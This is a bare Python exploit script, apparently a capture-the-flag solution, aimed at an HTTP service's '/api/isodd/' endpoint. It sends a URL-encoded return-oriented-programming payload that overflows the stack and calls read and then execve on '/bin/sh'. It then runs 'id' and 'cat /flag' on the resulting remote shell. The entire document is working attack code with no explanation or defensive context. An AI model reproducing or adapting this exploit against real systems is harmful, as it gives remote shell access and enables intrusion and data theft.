import os, sys, struct, socket, time

def unpack(s):
    return struct.unpack('<Q', s)[0]

def pack(x):
    s = struct.pack('<Q', x)
    return ''.join('%%%02x' % c for c in s)

syscall3 = 0x4006F8
call_syscall6 = 0x4077E4
sys_read = 63
sys_execve = 221
sub_rsp_40 = 0x4002B8
bss = 0x041D260
path = bss
argv = 0x41CF80

payload = '%?1' + 'C' * 0xf + 'A' * 0x8 + pack(sub_rsp_40) + 'B' * 0x20 + pack(8) + pack(bss) + pack(0) + pack(sys_read) + pack(0) + pack(call_syscall6)
full = 'GET /api/isodd/%s HTTP/1.1\r\n' % payload
full = full.ljust(0x3b0, 'X').encode('utf-8')
full += struct.pack('<QQQQQQ', 0, argv, path, sys_execve, 0, syscall3)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

s.send(full)
time.sleep(0.5)
s.send(b'/bin/sh\0')
s.send(b'id\ncat /flag\nexit\n')
print(s.recv(1000))
